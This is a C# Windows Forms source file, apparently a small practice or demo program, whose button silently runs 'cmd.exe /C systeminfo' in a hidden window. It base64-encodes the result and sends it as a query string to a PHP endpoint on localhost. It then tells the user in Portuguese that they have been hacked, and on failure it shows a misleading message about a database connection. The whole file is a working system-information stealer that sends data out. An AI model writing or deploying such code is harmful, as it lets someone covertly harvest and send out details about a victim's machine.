using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http.Headers;

namespace requestget
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        public void Post(string config)
        {

            try
            {

                var request = System.Net.WebRequest.Create("http://localhost/index.php?system=" + config);
                request.Method = "GET";


                using (var response = request.GetResponse())
                {

                }

                MessageBox.Show("Muito bem! Voce foi hackeado com Sucesso!");

            }
            catch
            {

                MessageBox.Show("Nao foi possivel se conectar ao banco...." );
            }
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput =true ;
            startInfo.CreateNoWindow = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C systeminfo";
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            byte[] textoAsBytes = Encoding.ASCII.GetBytes(output);
            string output2 = Convert.ToBase64String(textoAsBytes);

            Post(output2);



        }
    }
}
